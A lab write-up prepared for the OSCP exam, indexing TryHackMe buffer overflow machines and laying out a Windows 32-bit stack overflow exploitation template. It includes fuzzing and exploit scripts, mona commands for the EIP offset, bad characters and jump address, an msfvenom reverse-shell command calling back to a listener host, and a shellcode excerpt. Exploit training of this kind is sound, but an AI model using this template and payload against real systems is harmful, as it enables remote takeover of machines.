# Buffer Overflow Prep from tryhackme.

This series of write-ups was to help me prep for a potential buffer overflow box for the revised OSCP exam.

Following the guide from [Tib3rius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst) (who also happens to be a co-author of this series.

This write-up containts the following machines, as well as a template for exploitation written bellow.

# Vulnerable Applications

- [The SLMail installer](/TryHackMe/Buffer_Overflow_Prep/slmail.md)

- [The brainpan binary](/TryHackMe/Buffer_Overflow_Prep/brainpan.md)

- [The dostackbufferoverflowgood binary](/TryHackMe/Buffer_Overflow_Prep/dostackbufferoverflowgood.md)

- [The vulnserver binary](/TryHackMe/Buffer_Overflow_Prep/vulnserver.md)

- [custom written "oscp" binary 1](/TryHackMe/Buffer_Overflow_Prep/1.md)

- [custom written "oscp" binary 2](/TryHackMe/Buffer_Overflow_Prep/2.md)

- [custom written "oscp" binary 3](/TryHackMe/Buffer_Overflow_Prep/3.md)

- [custom written "oscp" binary 4](/TryHackMe/Buffer_Overflow_Prep/4.md)

- [custom written "oscp" binary 5](/TryHackMe/Buffer_Overflow_Prep/5.md)

- [custom written "oscp" binary 6](/TryHackMe/Buffer_Overflow_Prep/6.md)

- [custom written "oscp" binary 7](/TryHackMe/Buffer_Overflow_Prep/7.md)

- [custom written "oscp" binary 8](/TryHackMe/Buffer_Overflow_Prep/8.md)

- [custom written "oscp" binary 9](/TryHackMe/Buffer_Overflow_Prep/9.md)

- [custom written "oscp" binary 10](/TryHackMe/Buffer_Overflow_Prep/10.md)

# BUFFER OVERFLOW METHODOLOGY.

[Tools](#tools-being-used)

[Fuzzing](#fuzzing)

[Crash Replication & Controlling EIP](#eip)

[Finding Bad Characters](#finding-bad-characters)

[Finding A Jump Point](#finding-a-jump-point)

[Generating a Payload](#generating-a-payload)

[Prepend NOP sled](#prepend-nop-sled)

[Final Buffer](#final-buffer)

A buffer overflow happens when the amount of data being placed into memory is greater than the buffer(or area) that was provided, causing the extra data to "overflow" into neighboring memory-space. This can allow an attacker to craft target specific data that can end up controlling the execution flow of the program, once they have broken free of the buffer prison. This is a template for discovering and exploiting buffer overflows on windows 32 bit systems.

## Tools being used

On the target system we will be using a debugger to view and pause the execution flow of the vulnerable applications, as well as search through system memory in order to craft our attack. The debugger being used in these examples is immunity debugger.

### IMMUNITY TIPS

- If at all possible, run as Administrator

- If target application is already running `File -> Attach`

- If target application is not running `File -> Open`

- If target application is a windows service may have to use `sc`

- To stop/start a windows service with sc `sc stop/start "service name"`

- `CTR F2` Restarts target application

- `F9` Runns the program (starts paused)

### MONA Configuration.

Mona is a powerful plugin for Immunity Debugger, written in python, that makes exploiting buffer overflows much easier.

- The latest version can be downloaded here: https://github.com/corelan/mona
- The manual can be found here: https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
- Copy the mona.py file into the PyCommands directory of Immunity Debugger (usually located at C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands).
- In Immunity Debugger, type the following to set a working directory for mona.

```
!mona config -set workingfolder c:\mona\%p
```
## FUZZING

Fuzzing is the process of sending increasing lengths of data in order to crash the application, and then using a debugger to verify that EIP has been overwritten.

The sample python code below can be modified to automate that task. It will send the character A's `\x41` in hex).


### fuzz.py
```python
import socket, time, sys

ip = "10.0.0.1"
port = 21
timeout = 5

# Create an array of increasing length buffer strings.
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        s.send("USER username\r\n")
        s.recv(1024)

        print("Fuzzing PASS with %s bytes" % len(string))
        s.send("PASS " + string + "\r\n")
        s.recv(1024)
        s.send("QUIT\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

## EIP

First step is going to be to find the EIP register, here is a template for the actual expoit that can be modified to find and create the buffer overflow.

### bof_template.py

```python
import socket

ip = "10.0.0.1"
port = 21

prefix = ""
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
```


With the <length> of bytes that caused the crash add 400 to make sure there is enough space for your shellcode. The guide written for this has you using the metasploit module pattern_create, but since we are already using mona from within mona, there is no reason not to just do this step on the target.


From within immunity CLI

`!mona pc <length>`

-OR-

Using metasploit (one of the modules allowed for OSCP)

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>|xclip -selection clipboard`

After updating the bof_template.py to find_eip.py by adding the above generated pattern into the buffer variable 

```python
prefix = ""
offset = 0
overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9
"
retn = ""
padding = ""
payload = ""
postfix = "" 
```

With the pattern loaded into the buffer, use mona from within immunity to find the offset of EIP. For the example below the length value is 600.  
    
```
!mona findmsp -distance 600
...
[+] Looking for cyclic pattern in memory
Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
EIP contains normal pattern : 0x78413778 (offset 112)
ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
EAX (0x017df764) points at offset 0 in normal pattern (length 600)
EBP contains normal pattern : 0x41367841 (offset 108)
... 
```
    Note the EIP offset (112) and any other registers that point to the pattern, noting their offsets as well. It seems like the ESP register points to the last 484 bytes of the pattern, which is enough space for our shellcode.

Create a new buffer using this information to ensure that we can control EIP:
    
```python
prefix = ""
offset = 112
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = "C" * (600-112-4)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix 
```
 Crash the application using this buffer, and make sure that EIP is overwritten by B's (`\x42`) and that the ESP register points to the start of the C's (`\x43`).
    
## Finding Bad Characters
    
We need to see which characters will be corrupted. To do this we will generate a byte array of all possible characters using mona, and a matching byte array using python.
    
 To generate bytearray.bin in the current directory in mona (and exclude the null byte `\x00`)
 ```
 !mona bytearray -b "\x00"
 ```
 To create a bytearray.py that we can use for find_bad_chars.py script
    
 ```python
 #!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()   
 ```
 
To then create find_bad_chars.py with this info
 
 ```python
 badchars = "\x01\x02\x03\x04\x05...\xfb\xfc\xfd\xfe\xff"
payload = badchars + "C" * (600-112-4-255)
 ```
Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.

Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:

```
!mona compare -f C:\mona\appname\bytearray.bin -a <address>
```
From THM:
"A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist."

## Finding a jump point

To find a command (like jmp) in mona without bad chars \x00, \x0a, and \x0d. 

```
!mona jmp -r esp -cpb "\x00\x0a\x0d"
```

Can also use the mona find command to search for with filters

```
!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00\x0a\x0d"
```

Once an address is found set it to the rtn variable in the python script, reversing the order as displayed in mona (ei \x01\x02\x03\x04 in Immunity, is \x04\x03\x02\x01 in python script) do to little endian format.

below would have the address shown in immunity as `\x9A\x43\x23\x56`

```pyhton
prefix = ""
offset = 112
overflow = "A" * offset
retn = "\x56\x23\x43\x9A"
```

## Generating A Payload

Using msfvenom to create the shellcode (exluding "\x00\x0a\x0d" as badchars in this example)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c
```

Then update the payload variable to create exploit.py (follow below format)

```python
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

## Prepend NOP sled

If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\x90) to the payload.


```python
prefix = ""
offset = 112
overflow = "A" * offset
retn = "\x56\x23\x43\x9A"
padding = "\x90" * 16
payload = "\xdb\xde\xba\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1..."
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix
```

